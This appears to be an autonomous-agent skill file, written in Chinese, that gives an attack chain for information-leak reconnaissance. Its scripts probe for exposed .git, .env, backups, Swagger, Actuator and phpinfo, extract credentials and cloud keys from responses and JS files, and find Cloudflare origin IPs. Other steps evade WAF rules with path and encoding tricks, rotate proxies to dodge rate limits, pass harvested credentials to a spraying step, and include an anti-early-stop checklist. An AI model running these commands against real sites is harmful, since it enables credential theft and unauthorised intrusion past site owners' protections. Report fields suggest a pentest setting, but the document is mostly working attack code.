---
name: sensitive-info-leakage
description: Sensitive information leakage detection including source IP discovery for Cloudflare bypass, JS endpoint extraction, and credential harvesting
version: 1.0.0
---

# 信息泄露与源站发现

## 适用场景

侦察阶段和利用阶段均需加载。覆盖敏感文件探测 → 注释/调试/源码泄露 → Swagger/API 泄露 → Actuator/phpinfo → 错误信息 → JS 文件正则提取 → 源站 IP 发现 (Cloudflare 绕过)完整链。

## 前置 skill

- waf-detection-and-fingerprinting (强制,源站发现服务于 WAF 绕过)

## 攻击链

### 1) 敏感文件探测

```bash
# 常见敏感文件 — 直连版
for path in ".git/config" ".git/HEAD" ".env" ".env.local" ".env.production" "wp-config.php" "config.php" "database.yml" "application.properties" "application.yml" ".htaccess" ".htpasswd" "web.config" "crossdomain.xml" "robots.txt" "sitemap.xml" ".DS_Store" "Thumbs.db" ".svn/entries" "WEB-INF/web.xml" "backup.zip" "backup.tar.gz" "dump.sql" "db.sql" ".bash_history" "id_rsa" ".npmrc" ".dockerenv" "Dockerfile" "docker-compose.yml" "Jenkinsfile" ".gitlab-ci.yml" ".travis.yml"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/${path}")
  [ "$code" != "404" ] && echo "[${code}] https://TARGET/${path}"
done

# 代理版
for path in ".git/config" ".env" "wp-config.php" "WEB-INF/web.xml" "backup.zip"; do
  code=$(curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 -o /dev/null -w "%{http_code}" "https://TARGET/${path}")
  [ "$code" != "404" ] && echo "[${code}] https://TARGET/${path}"
done

# dirsearch 批量 — 直连版
dirsearch -u https://TARGET -e php,asp,aspx,jsp,bak,zip,sql,conf,yml,json,xml,txt,log,env -x 404

# 代理版
dirsearch -u https://TARGET -e php,asp,aspx,jsp,bak,zip,sql,conf,yml,json,xml,txt,log,env -x 404 --proxy socks5://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000

# nuclei 信息泄露模板 — 直连版
nuclei -u https://TARGET -tags exposure,config,backup,git,debug,disclosure -silent

# 代理版
nuclei -u https://TARGET -tags exposure,config,backup,git,debug,disclosure -silent -proxy http://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:1000
```

### 2) Git 仓库泄露

```bash
# .git 目录确认
curl -sk "https://TARGET/.git/config"
curl -sk "https://TARGET/.git/HEAD"

# 若存在,提取 commit 历史挖凭据
curl -sk "https://TARGET/.git/logs/HEAD"
# 使用 git-dumper 类工具 (若已集成) 或手工下载 objects
```

### 3) 注释/调试/源码泄露

```bash
# 抓取页面分析注释
curl -sk https://TARGET | grep -oE '<!--.*?-->' | head -50
curl -sk https://TARGET | grep -iE 'TODO|FIXME|HACK|password|secret|api.key|token|debug|test'

# 调试页面
for path in "debug" "trace" "test" "phpinfo.php" "info.php" "test.php" "_debug" "elmah.axd" "server-status" "server-info"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/${path}")
  [ "$code" = "200" ] && echo "[200] https://TARGET/${path}"
done
```

### 4) Swagger / API 文档泄露

```bash
# Swagger/OpenAPI
for path in "swagger-ui.html" "swagger/index.html" "api-docs" "v2/api-docs" "v3/api-docs" "swagger.json" "openapi.json" "swagger.yaml" "api/swagger" "docs/api" "redoc" "graphql" "graphiql" "altair" "playground"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/${path}")
  [ "$code" = "200" ] && echo "[200] https://TARGET/${path}"
done

# GraphQL 自省
curl -sk "https://TARGET/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

### 5) Actuator / phpinfo / 中间件信息

```bash
# Spring Boot Actuator
for ep in "actuator" "actuator/env" "actuator/configprops" "actuator/mappings" "actuator/beans" "actuator/heapdump" "actuator/threaddump" "actuator/loggers" "actuator/metrics" "actuator/health" "actuator/info" "actuator/httptrace" "actuator/jolokia"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/${ep}")
  [ "$code" = "200" ] && echo "[200] https://TARGET/${ep}"
done

# 提取 Actuator env 中的凭据
curl -sk "https://TARGET/actuator/env" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(p['name'],':',{pp['key']:pp['value'] for pp in p.get('properties',{}).values() if isinstance(pp,dict)}) for p in d.get('propertySources',[])]" 2>/dev/null

# phpinfo
curl -sk "https://TARGET/phpinfo.php" | grep -iE 'DOCUMENT_ROOT|SERVER_ADDR|DB_|MYSQL_|REDIS_|password|secret|key|token'
```

### 6) 错误信息泄露

```bash
# 触发错误
curl -sk "https://TARGET/nonexistent_path_12345"
curl -sk "https://TARGET/page?id='"
curl -sk "https://TARGET/page?id[]=1"
curl -sk "https://TARGET/" -H "Content-Type: invalid"

# 分析错误页中的信息
# 关注: 框架版本 / 文件路径 / 数据库类型 / 内网 IP / 堆栈跟踪
```

### 7) JS 文件正则提取 endpoint / AK SK

```bash
# 提取 JS 文件列表
curl -sk https://TARGET | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//'
katana -u https://TARGET -jc -d 2 | grep '\.js$' | sort -u > /tmp/js_files.txt

# 正则提取敏感信息
while read js; do
  content=$(curl -sk "$js")
  echo "$content" | grep -oE '(api|endpoint|url|path|route)["\x27]?\s*[:=]\s*["\x27][^"\x27]+' | head -20
  echo "$content" | grep -oE '(AKIA[A-Z0-9]{16}|ASIA[A-Z0-9]{16})' | head -5
  echo "$content" | grep -oE '(access.?key|secret.?key|api.?key|token|password|passwd|authorization)["\x27]?\s*[:=]\s*["\x27][^"\x27]+' | head -20
  echo "$content" | grep -oE 'https?://[a-zA-Z0-9._/-]+' | head -50
done < /tmp/js_files.txt

# 提取的 endpoint 回喂 nuclei / arjun
cat /tmp/extracted_endpoints.txt | nuclei -silent -tags cve,exposure
cat /tmp/extracted_endpoints.txt | arjun -i -
```

### 8) 源站 IP 发现 (Cloudflare / CDN 绕过)

```bash
# DNS 历史记录查询 (通过已集成搜索能力)
# 历史 DNS 记录中可能包含 CDN 部署前的真实 IP

# SSL 证书关联
curl -sk "https://crt.sh/?q=TARGET_DOMAIN&output=json" | python3 -c "import sys,json; [print(c['name_value']) for c in json.loads(sys.stdin.read())]" 2>/dev/null | sort -u

# 邮件头分析 (MX 记录指向的 IP 可能是源站)
dig MX TARGET_DOMAIN +short
# 发送注册/密码重置邮件,查看邮件头 Received 字段中的 IP

# favicon hash 关联
curl -sk "https://TARGET/favicon.ico" | md5sum
# 用 hash 在 FOFA/Shodan 搜索: icon_hash:"HASH"

# 子域名可能暴露源站
subfinder -d TARGET_DOMAIN -silent | httpx -silent -ip | grep -v 'cloudflare'

# 源站验证 (curl --resolve 绕过 CDN)
curl -sk --resolve TARGET_DOMAIN:443:SUSPECTED_IP https://TARGET_DOMAIN/ -D -
# 对比 CDN 响应和直连响应的一致性

# nuclei 源站发现模板
nuclei -u https://TARGET -tags cdn,cloudflare -silent
```

### 9) 信息汇总 + 回喂攻击链

所有发现的 endpoint / 凭据 / 源站 IP 回喂到其他攻击 skill:
- 提取的 API endpoint → 输入到 sqli / xss / idor 等 skill
- 发现的凭据 → 输入到 credential-spray-reuse skill
- 源站 IP → 用于绕过 CDN/WAF 直接攻击

## WAF 对抗集成

信息泄露探测通常不触发 WAF (请求为合法 GET),但:
- 大量路径爆破可能触发频率限制 → 走代理 + 降速
- 敏感文件访问可能被 WAF 特殊规则拦截 (.env / .git) → URL 编码 / 路径变形

```bash
# .git 被 WAF 拦截的绕过
curl -sk "https://TARGET/.git/config"        # 原始
curl -sk "https://TARGET/.GIT/config"        # 大小写
curl -sk "https://TARGET/;.git/config"       # 分号前缀
curl -sk "https://TARGET/.git%2fconfig"      # URL 编码斜杠
curl -sk "https://TARGET/.git/./config"      # 点斜杠
```

## 代理池启用判定

- 路径爆破 (dirsearch/ffuf) → WAF 场景走代理
- 单次敏感文件检查 → 直连
- JS 批量下载分析 → 视频率决定
- 源站 IP 验证 → 直连 (需确认直连是否可达)

## 敏感数据采集点

- 凭据类: .env 中的 API Key / 数据库密码 / JWT Secret / 云 AK SK
- 系统类: 内网 IP / 文件路径 / 框架版本 / 中间件版本 / 配置文件
- 账户类: phpinfo 中的变量 / Actuator env 中的凭据 / Git 历史中的密码
- 业务敏感: API 文档 / 数据库备份 / 源码

## 失败处理

1. 常见路径全 404 → 扩大字典 / 用 katana 爬取发现隐藏路径
2. .git 被 WAF 拦截 → URL 编码 / 大小写 / 路径变形
3. JS 文件混淆 → 尝试 source map / 反混淆工具
4. 源站 IP 不可达 → 尝试更多关联方法 (邮件 / 子域 / 证书)
5. Actuator 需认证 → 尝试默认凭据 / Spring Boot 已知漏洞

## 报告必填字段

- 漏洞标题 / 漏洞指纹 / 完整 PoC
- WAF 类型 + 绕过路径
- 泄露数据类型 + 内容摘要
- 泄露路径 / URL
- 凭据列表 (脱敏)
- 源站 IP (若发现)
- 影响半径 / CVSS 3.1 + 向量串
- 修复建议 / 攻击时间线

## 反早停检查

1. 是否检查了 .git / .env / backup / Swagger / Actuator / phpinfo 全部类型?
2. 是否对 JS 文件做了正则提取并将结果回喂攻击链?
3. 是否尝试了源站 IP 发现 (CDN 场景)?
